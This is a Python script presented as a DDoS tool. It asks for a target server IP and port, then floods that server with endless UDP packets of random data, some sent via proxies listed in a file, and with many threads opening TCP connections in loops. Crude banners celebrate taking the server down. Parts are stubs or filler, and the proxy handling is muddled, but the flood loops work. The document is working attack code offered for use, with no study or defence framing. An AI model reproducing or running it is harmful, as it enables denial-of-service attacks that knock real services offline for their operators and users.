import random
import socket
import threading
import time
import platform
import requests
from queue import Queue

print("DDoS is Running in: " + platform.system())

if platform.system() == 'Windows':
    print("\n\nDDOS ATTACK\n\n")
else:
    print("\n\nDDOS ATTACK\n\n")

print("DDos")
ip = str(input("                   | Server IP | : "))
port = int(input("                   | Port | : "))
choice = str(input("                   | DDoS Attack? (y/n) | : "))
packet_batch_size = int(input("                   | Packet Batch Size | : "))
threads = int(input("                   | Number of Threads | : "))

proxy_list = []
spam_thread = None

def load_proxies():
    with open("proxy.txt", "r") as proxy_file:
        for line in proxy_file:
            proxy_list.append(line.strip())

def send_packets(proxy_ip, proxy_port, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    s.connect((proxy_ip, proxy_port))
    addr = (str(ip), int(port))

    while True:
        for _ in range(packet_batch_size):
            s.sendto(data, addr)

def send_to_server(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip), int(port))

    while True:
        s.sendto(data, addr)

def run(proxy):
    data = random._urandom(1024)
    i = random.choice(("[-]", "[•]", "[×]"))
    try:
        proxy_parts = proxy.split(":")
        proxy_ip = proxy_parts[0]
        proxy_port = int(proxy_parts[1])

        th_send_packets = threading.Thread(target=send_packets, args=(proxy_ip, proxy_port, data))
        th_send_packets.start()

        print(i + "cyber!!!!!!")
        print("Proxy used: " + proxy_ip + ":" + str(proxy_port))

    except:
        print("[!] SERVER FUCKED BY cyber!!!")

def run_server():
    data = random._urandom(16)
    i = random.choice(("[-]", "[+]", "[x]"))

    th_send_to_server = threading.Thread(target=send_to_server, args=(data,))
    th_send_to_server.start()

    print(i + "CYBER FTW!!!!!!")
    print("Server IP: " + ip)

def spam():
    global spam_thread
    data = random._urandom(1024)

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (str(ip), int(port))
        s.sendto(data, addr)

def start_spam():
    global spam_thread
    if spam_thread is None or not spam_thread.is_alive():
        spam_thread = threading.Thread(target=spam)
        spam_thread.start()
        print("Spamming started.")
    else:
        print("Spamming is already running.")

def stop_spam():
    global spam_thread
    if spam_thread is not None and spam_thread.is_alive():
        spam_thread.join()
        print("Spamming stopped.")
    else:
        print("Spamming is not running.")

def dos():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))

def dos2():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        
def dos3():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))

def dos4():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))       

def dos5():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))       

def dos6():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))       

def dos7():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))       

def dos8():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))       

def http_attack(proxy):
    # Your HTTP attack logic goes here
    try:
        proxy_parts = proxy.split(":")
        proxy_ip = proxy_parts[0]
        proxy_port = int(proxy_parts[1])

        proxies = {
            'http': f"http://{proxy_ip}:{proxy_port}",
            'https': f"http://{proxy_ip}:{proxy_port}"
        }

        # Make HTTP requests using the proxy
        # Example:
        # response = requests.get("http://example.com", proxies=proxies)
        # print(response.text)
    except:
        print("Error in HTTP attack.")

def monitor():
    # Your monitoring logic goes here
    pass

load_proxies()

for proxy in proxy_list:
    th_proxy = threading.Thread(target=run, args=(proxy,))
    th_proxy.start()

if choice == 'y':
    th_server = threading.Thread(target=run_server)
    th_server.start()

start_spam()

# Mini Script for Packet Sending and DDoS
for x in range(int(threads) + 1):
    threading.Thread(target=dos).start()
    threading.Thread(target=dos2).start()
    threading.Thread(target=dos3).start()
    threading.Thread(target=dos4).start()
    threading.Thread(target=dos5).start()
    threading.Thread(target=dos6).start()
    threading.Thread(target=dos7).start()
    threading.Thread(target=dos8).start()
    time.sleep(0.002)

print("Attacking...")

q = Queue()
w = Queue()

def process_queue(queue):
    while True:
        item = queue.get()
        # Process the item here
        print("Processing item:", item)
        time.sleep(0.1)  # Simulate processing time
        queue.task_done()

for _ in range(2):
    t = threading.Thread(target=process_queue, args=(q,))
    t.daemon = True
    t.start()

for _ in range(2):
    t = threading.Thread(target=process_queue, args=(w,))
    t.daemon = True
    t.start()

item = 0
while True:
    if item > 1800:  # for no memory crash
        item = 0
        time.sleep(0.1)
    item = item + 1
    q.put(item)
    w.put(item)

q.join()
w.join()
